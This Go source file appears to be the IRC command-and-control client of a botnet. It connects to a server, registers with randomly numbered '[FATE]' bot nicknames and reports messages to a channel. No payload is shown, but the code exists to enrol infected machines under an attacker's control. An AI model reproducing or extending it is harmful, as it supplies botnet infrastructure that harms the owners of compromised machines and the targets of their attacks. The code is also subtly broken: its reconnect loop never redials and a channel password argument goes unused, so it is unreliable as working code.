package pkg

import (
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"
)

type logFormation struct {
	user, nick string
}

func IRC_Conn(set_serv string) net.Conn {
	ircConn, err := net.Dial("tcp", set_serv)
	for err != nil {
		time.Sleep(10 * time.Second)
		continue
	}
	return ircConn
}

func IRC_Find(read, msg string) bool {
	return strings.Contains(read, msg)
}

func IRC_Recv(command string, arg int) string {
	return strings.Split(command, " ")[arg]
}

func IRC_Send(sendIRC net.Conn, data string) {
	fmt.Fprintf(sendIRC, "%s\r\n", data)
}

func IRC_Report(set_server net.Conn, set_chan, msg string) {
	IRC_Send(set_server, "PRIVMSG "+set_chan+" "+" :"+msg)
}

func IRC_Login(log_serv net.Conn, set_chan, set_chan_pass string) {
	rand.Seed(time.Now().UnixNano())
	alphabet := 'A' + rune(rand.Intn(26))
	sAlphabet := string(alphabet)
	botID := rand.Intn(1000000)

	//Change bot profile here.
	botformation := logFormation{
		user: fmt.Sprint("USER [FATE][", sAlphabet, "][", botID, "]", " 8 * :bot"),
		nick: fmt.Sprint("NICK [FATE][", sAlphabet, "][", botID, "]"),
	}

	IRC_Send(log_serv, botformation.user)
	IRC_Send(log_serv, botformation.nick)
}
